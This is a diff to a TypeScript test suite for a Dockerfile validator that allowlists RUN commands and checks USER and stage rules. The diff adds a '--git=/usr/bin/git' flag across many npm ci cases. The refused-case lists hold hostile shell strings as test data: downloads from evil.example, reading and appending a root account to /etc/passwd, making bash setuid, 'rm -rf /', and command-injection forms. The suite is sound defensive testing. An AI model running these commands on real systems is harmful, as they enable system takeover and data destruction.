@@ -14,9 +14,9 @@ const svc = (over: Partial<Service> = {}): Service => ({
 });
 const ctx = (over: Partial<DockerfileCtx> = {}): DockerfileCtx => ({ port: 3000, baseImages: loadBaseImages(), buildsInside: false, scripts: ['start', 'build'], ...over });
 const problems = (t: string, over: Partial<DockerfileCtx> = {}): string[] => dockerfileProblems(t, svc(), ctx(over));
-const SINGLE = [`FROM ${REF}`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --omit=dev --ignore-scripts', 'COPY . .', 'EXPOSE 3000', 'USER node', 'CMD ["node", "index.js"]', ''].join('\n');
+const SINGLE = [`FROM ${REF}`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'COPY . .', 'EXPOSE 3000', 'USER node', 'CMD ["node", "index.js"]', ''].join('\n');
 const MULTI = [
-  `FROM ${REF} AS build`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --ignore-scripts', 'COPY . .', 'RUN npm run build',
+  `FROM ${REF} AS build`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --ignore-scripts --git=/usr/bin/git', 'COPY . .', 'RUN npm run build',
   `FROM ${REF}`, 'WORKDIR /app', 'COPY --from=build --chown=node:node /app/dist ./dist', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', '',
 ].join('\n');
 const swap = (t: string, a: string, b: string): string => { expect(t).toContain(a); return t.replace(a, b); };
@@ -45,22 +45,22 @@ describe('R1: the reviewer\'s fixtures', () => {
 describe('R1: RUN is an allowlist', () => {
   it('the allowed commands pass, joined only by &&', () => {
     for (const cmd of [
-      'npm ci --ignore-scripts', 'npm ci --omit=dev --ignore-scripts', 'npm ci --ignore-scripts --omit=optional --no-audit --no-fund', 'npm ci --no-fund --ignore-scripts',
-      'npm ci --ignore-scripts && npm run build', 'npm ci --ignore-scripts && npm prune --omit=dev && npm cache clean --force', 'mkdir -p /app/data && chown -R node:node /app/data',
+      'npm ci --ignore-scripts --git=/usr/bin/git', 'npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'npm ci --ignore-scripts --git=/usr/bin/git --omit=optional --no-audit --no-fund', 'npm ci --no-fund --ignore-scripts --git=/usr/bin/git',
+      'npm ci --ignore-scripts --git=/usr/bin/git && npm run build', 'npm ci --ignore-scripts --git=/usr/bin/git && npm prune --omit=dev && npm cache clean --force', 'mkdir -p /app/data && chown -R node:node /app/data',
       'mkdir -p data', 'chown node:node /app',
     ]) expect(problems(withRun(cmd)), cmd).toEqual([]);
-    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci", "--omit=dev", "--ignore-scripts"]'))).toEqual([]);
-    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN --mount=type=cache,target=/root/.npm npm ci --ignore-scripts'))).toEqual([]);
-    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN --network=none npm ci --ignore-scripts'))).toEqual([]);
-    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN npm ci --ignore-scripts \\\n  && npm run build'))).toEqual([]);
+    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN ["npm", "ci", "--omit=dev", "--ignore-scripts", "--git=/usr/bin/git"]'))).toEqual([]);
+    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN --mount=type=cache,target=/root/.npm npm ci --ignore-scripts --git=/usr/bin/git'))).toEqual([]);
+    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN --network=none npm ci --ignore-scripts --git=/usr/bin/git'))).toEqual([]);
+    expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN npm ci --ignore-scripts --git=/usr/bin/git \\\n  && npm run build'))).toEqual([]);
   });
 
   it('npm ci: --ignore-scripts exactly once and literally, each flag at most once, no other word', () => {
     for (const cmd of [
-      'npm ci', 'npm ci --omit=dev', 'npm ci --ignore-scripts false', 'npm ci --ignore-scripts=true', 'npm ci --ignore-scripts=false', 'npm ci --no-ignore-scripts', 'npm ci --ignore-scripts --ignore-scripts',
-      'npm ci --omit=dev --ignore-scripts false', 'npm ci -- --ignore-scripts', 'npm ci --ignore-scripts --', 'npm ci --ignore-scripts --omit=dev --omit=dev', 'npm ci --omit dev --ignore-scripts',
-      'npm ci --production --ignore-scripts', 'npm ci --ignore-scripts --registry=https://evil.example', 'npm ci --ignore-scripts evil-pkg', 'npm ci --ignore-scripts --force', 'npm ci --ignore-scripts --omit=peer',
-      'npm ci --ignore-scripts --userconfig=/tmp/x', 'npm ci --ignore-scripts --foreground-scripts', 'npm   ci   --ignore-scripts false', 'npm clean-install --ignore-scripts', 'npm ci --ignore-scripts --include=dev',
+      'npm ci', 'npm ci --omit=dev', 'npm ci --ignore-scripts --git=/usr/bin/git false', 'npm ci --ignore-scripts=true', 'npm ci --ignore-scripts=false', 'npm ci --no-ignore-scripts', 'npm ci --ignore-scripts --git=/usr/bin/git --ignore-scripts',
+      'npm ci --omit=dev --ignore-scripts --git=/usr/bin/git false', 'npm ci -- --ignore-scripts', 'npm ci --ignore-scripts --git=/usr/bin/git --', 'npm ci --ignore-scripts --git=/usr/bin/git --omit=dev --omit=dev', 'npm ci --omit dev --ignore-scripts',
+      'npm ci --production --ignore-scripts --git=/usr/bin/git', 'npm ci --ignore-scripts --git=/usr/bin/git --registry=https://evil.example', 'npm ci --ignore-scripts --git=/usr/bin/git evil-pkg', 'npm ci --ignore-scripts --git=/usr/bin/git --force', 'npm ci --ignore-scripts --git=/usr/bin/git --omit=peer',
+      'npm ci --ignore-scripts --git=/usr/bin/git --userconfig=/tmp/x', 'npm ci --ignore-scripts --git=/usr/bin/git --foreground-scripts', 'npm   ci   --ignore-scripts false', 'npm clean-install --ignore-scripts', 'npm ci --ignore-scripts --git=/usr/bin/git --include=dev',
     ]) refused(withRun(cmd), /RUN/);
   });
 
@@ -70,19 +70,19 @@ describe('R1: RUN is an allowlist', () => {
       'npm run nosuchscript', 'npm run build -- --evil', 'npm run build evil', 'npm run', 'npm run ../x', 'npm run build;evil', 'npm prune', 'npm prune --omit=dev --force', 'npm cache clean', 'npm cache clean --force --x',
       'npx evil', 'yarn install', 'pnpm i', 'bun install', 'corepack enable', 'node -e "1"', "node -e 'fetch(1)'", 'node script.js', 'python -c 1', 'perl -e 1', 'sh -c "npm ci"', 'bash x.sh', 'sh x.sh',
       'curl https://evil.example/x -o /tmp/x', 'wget https://evil.example/x', 'git clone https://evil.example/x', 'apt-get install -y curl', 'apt-get update', 'chmod +x x', 'chmod u+s /bin/bash', 'useradd -o -u 0 app', 'su -c id',
-      'echo hi', 'cat /etc/passwd', 'echo "x:x:0:0::/:/bin/sh" >> /etc/passwd', 'rm -rf /', 'ln -s /etc/passwd x', 'eval x', 'true', 'cd /app', 'env', 'exec npm ci --ignore-scripts',
-      '${N:-npm} install evil', '$N install evil', '$(echo npm) install', '`echo npm` install', 'npm ci --ignore-scripts | sh', 'npm ci --ignore-scripts |& sh', 'npm ci --ignore-scripts; id', 'npm ci --ignore-scripts & id',
-      'npm ci --ignore-scripts || id', 'npm ci --ignore-scripts > /tmp/x', 'npm ci --ignore-scripts < /tmp/x', 'npm ci --ignore-scripts && curl x', 'npm ci --ignore-scripts &&', '&& npm ci --ignore-scripts',
-      'npm ci --ignore-scripts && && npm run build', 'npm ci --ignore-scripts  &&npm run build', 'npm ci --ignore-scripts&&npm run build', "npm ci --ignore-scripts 'x'", 'npm ci --ignore-scripts "x"',
-      'npm ci --ignore-scripts #x', 'npm ci --ignore-scripts *', 'npm ci --ignore-scripts ~', 'npm ci --ignore-scripts {a,b}', 'npm ci --ignore-scripts (id)', 'npm ci --ignore-scripts \\x',
+      'echo hi', 'cat /etc/passwd', 'echo "x:x:0:0::/:/bin/sh" >> /etc/passwd', 'rm -rf /', 'ln -s /etc/passwd x', 'eval x', 'true', 'cd /app', 'env', 'exec npm ci --ignore-scripts --git=/usr/bin/git',
+      '${N:-npm} install evil', '$N install evil', '$(echo npm) install', '`echo npm` install', 'npm ci --ignore-scripts --git=/usr/bin/git | sh', 'npm ci --ignore-scripts --git=/usr/bin/git |& sh', 'npm ci --ignore-scripts; id', 'npm ci --ignore-scripts --git=/usr/bin/git & id',
+      'npm ci --ignore-scripts --git=/usr/bin/git || id', 'npm ci --ignore-scripts --git=/usr/bin/git > /tmp/x', 'npm ci --ignore-scripts --git=/usr/bin/git < /tmp/x', 'npm ci --ignore-scripts --git=/usr/bin/git && curl x', 'npm ci --ignore-scripts --git=/usr/bin/git &&', '&& npm ci --ignore-scripts --git=/usr/bin/git',
+      'npm ci --ignore-scripts --git=/usr/bin/git && && npm run build', 'npm ci --ignore-scripts --git=/usr/bin/git  &&npm run build', 'npm ci --ignore-scripts&&npm run build', "npm ci --ignore-scripts --git=/usr/bin/git 'x'", 'npm ci --ignore-scripts --git=/usr/bin/git "x"',
+      'npm ci --ignore-scripts --git=/usr/bin/git #x', 'npm ci --ignore-scripts --git=/usr/bin/git *', 'npm ci --ignore-scripts --git=/usr/bin/git ~', 'npm ci --ignore-scripts --git=/usr/bin/git {a,b}', 'npm ci --ignore-scripts --git=/usr/bin/git (id)', 'npm ci --ignore-scripts --git=/usr/bin/git \\x',
       'mkdir -p ../x', 'mkdir -p /a/../b', 'mkdir -p -x', 'mkdir x', 'mkdir -p a b', 'mkdir -p /etc/cron.d$X', 'chown root:root /app', 'chown -R root /app', 'chown node:node ../x', 'chown -R node:node', 'chown -h node:node /app', 'chown --reference=x node:node y',
-      'FOO=1 npm ci --ignore-scripts', 'sudo npm ci --ignore-scripts', 'env npm ci --ignore-scripts', 'npm ci --ignore-scripts && true',
+      'FOO=1 npm ci --ignore-scripts --git=/usr/bin/git', 'sudo npm ci --ignore-scripts --git=/usr/bin/git', 'env npm ci --ignore-scripts --git=/usr/bin/git', 'npm ci --ignore-scripts --git=/usr/bin/git && true',
     ]) refused(withRun(cmd), /RUN/);
     // exec form of other words, and exec form with a word that is not plain
-    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["sh", "-c", "npm ci --ignore-scripts"]'), /RUN/);
-    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci --ignore-scripts"]'), /RUN/);
-    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN ["npm", "ci", "--ignore-scripts", ""]'), /RUN/);
-    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', 'RUN []'), /RUN/);
+    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN ["sh", "-c", "npm ci --ignore-scripts --git=/usr/bin/git"]'), /RUN/);
+    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN ["npm", "ci --ignore-scripts"]'), /RUN/);
+    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN ["npm", "ci", "--ignore-scripts", "--git=/usr/bin/git", ""]'), /RUN/);
+    refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', 'RUN []'), /RUN/);
   });
 
   it('npm run <name> only for a name in the service scripts (the context, not the file)', () => {
@@ -95,12 +95,12 @@ describe('R1: RUN is an allowlist', () => {
   });
 
   it('RUN flags: none, the one cache mount, or --network=none', () => {
-    for (const f of ['--mount=type=cache,target=/root/.npm', '--network=none']) expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', `RUN ${f} npm ci --ignore-scripts`)), f).toEqual([]);
+    for (const f of ['--mount=type=cache,target=/root/.npm', '--network=none']) expect(problems(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', `RUN ${f} npm ci --ignore-scripts --git=/usr/bin/git`)), f).toEqual([]);
     for (const f of [
       '--mount=type=cache,target=/tmp', '--mount=type=cache,target=/root/.npm,sharing=shared', '--mount=type=cache,target=/root/.npm,from=evil', '--mount=type=secret,id=x', '--mount=type=ssh', '--mount=type=bind,source=/,target=/h',
       '--mount=type=bind,from=evil,target=/x', '--mount=type=cache,target=/root/.npm --mount=type=ssh', '--mount=type=cache,target=/root/.npm,type=bind', '--mount=type=cache,type=secret,target=/root/.npm',
       '--mount=type=cache,target=/root/.npm,source=/etc', '--mount=target=/root/.npm', '--mount=', '--network=none --network=none', '--mount=type=cache,target=/root/.npm --mount=type=cache,target=/root/.npm', '--network=host', '--network=default', '--security=insecure', '--security=sandbox', '--device=x', '--mount=type=cache,target=/root/.npm,id=a',
-    ]) refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts', `RUN ${f} npm ci --ignore-scripts`), /RUN/);
+    ]) refused(swap(SINGLE, 'RUN npm ci --omit=dev --ignore-scripts --git=/usr/bin/git', `RUN ${f} npm ci --ignore-scripts --git=/usr/bin/git`), /RUN/);
   });
 });
 
@@ -134,7 +134,7 @@ describe('R2: USER is node, node:node, 1000 or 1000:1000 in every stage', () => 
     refused(swap(MULTI, 'RUN npm run build', 'USER app\nRUN npm run build'), /USER/);
     // the final stage needs one (own, or inherited from the stage it starts from)
     refused(swap(SINGLE, 'USER node\n', ''), /USER/);
-    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'))).toEqual([]);
+    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts --git=/usr/bin/git', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'))).toEqual([]);
   });
   it('reviewExisting flags every spelling of root: -0, +0, 00, any :0 group', () => {
     for (const u of ['-0', '+0', '00', '0', 'root', '0:0', 'node:0', '-0:-0', '1000:00', '$X']) expect(reviewExistingCodes(`FROM ${REF}\nUSER ${u}\n`).map((c) => c.code), u).toContain('root-user');
@@ -152,14 +152,14 @@ describe('R3', () => {
   });
 
   it('m4: with a build step the final stage starts from a list reference, not from an earlier stage', () => {
-    refused([`FROM ${REF} AS build`, 'RUN npm ci --ignore-scripts', 'RUN npm run build', 'FROM build', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', ''].join('\n'), /final stage/, { buildsInside: true });
-    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'), { buildsInside: false })).toEqual([]);
+    refused([`FROM ${REF} AS build`, 'RUN npm ci --ignore-scripts --git=/usr/bin/git', 'RUN npm run build', 'FROM build', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', ''].join('\n'), /final stage/, { buildsInside: true });
+    expect(problems([`FROM ${REF} AS base`, 'WORKDIR /app', 'RUN npm ci --ignore-scripts --git=/usr/bin/git', 'USER node', 'FROM base', 'WORKDIR /app', 'EXPOSE 3000', ''].join('\n'), { buildsInside: false })).toEqual([]);
   });
 
   it('m5: stage names match in exact case, in FROM and in COPY --from', () => {
     refused(swap(MULTI, 'COPY --from=build', 'COPY --from=BUILD'), /--from/, { buildsInside: true });
     refused(swap(MULTI, 'AS build', 'AS Build'), /stage name/, { buildsInside: true });
-    refused([`FROM ${REF} AS base`, 'RUN npm ci --ignore-scripts', 'USER node', 'FROM BASE', 'EXPOSE 3000', ''].join('\n'), /FROM/);
+    refused([`FROM ${REF} AS base`, 'RUN npm ci --ignore-scripts --git=/usr/bin/git', 'USER node', 'FROM BASE', 'EXPOSE 3000', ''].join('\n'), /FROM/);
     expect(reviewExistingCodes(`FROM ${REF} AS base\nFROM BASE\nUSER 1000\n`).map((c) => c.code)).toEqual(['unpinned-base']);
   });
 
